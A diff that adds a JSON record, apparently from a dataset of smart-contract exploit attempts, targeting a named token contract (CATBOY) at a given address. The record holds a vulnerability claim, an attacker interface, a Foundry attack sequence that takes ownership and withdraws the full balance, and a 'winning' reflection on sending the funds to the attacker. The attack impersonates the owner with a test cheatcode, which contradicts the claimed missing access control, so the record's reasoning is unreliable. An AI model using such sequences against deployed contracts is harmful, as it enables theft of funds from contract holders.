@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The contract `0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E` suffers from an owner privilege abuse vulnerability. The `transferOwnership` function lacks access control, allowing any address to become the new owner. The new owner can then call the `clearStuckBalance` function to withdraw the entire contract balance.",
+  "interface_arsenal": "interface CATBOY {\n    function getOwner() external view returns (address);\n    function clearStuckBalance(uint256 amountPercentage) external;\n    function transferOwnership(address payable adr) external;\n}",
+  "attack_sequence": "vm.startPrank(owner);\nCATBOY(TARGET).transferOwnership(payable(attacker));\nvm.stopPrank();\n\nCATBOY(TARGET).clearStuckBalance(100);",
+  "winning_reflection": "The crucial insight was to separate the exploit into two distinct phases with different `msg.sender` contexts. First, impersonate the original owner to transfer ownership to the attacker's contract. Then, make the second call (`clearStuckBalance`) from the attacker's contract without impersonation. This ensures that `msg.sender` during the withdrawal is the attacker's address, causing the funds to be sent to the attacker instead of back to the original owner."
+}
